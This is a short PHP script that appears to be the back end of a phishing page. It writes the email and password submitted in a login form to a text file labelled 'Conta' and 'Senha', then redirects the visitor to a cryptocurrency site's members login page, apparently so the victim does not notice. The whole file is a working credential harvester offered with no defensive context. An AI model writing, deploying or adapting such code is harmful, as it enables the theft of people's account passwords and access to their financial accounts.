<?php

file_put_contents("usernames.txt", "Conta: " . $_POST['email'] . " Senha: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: http://www.cryptocoinsniper.co/members/members/login ');
exit();
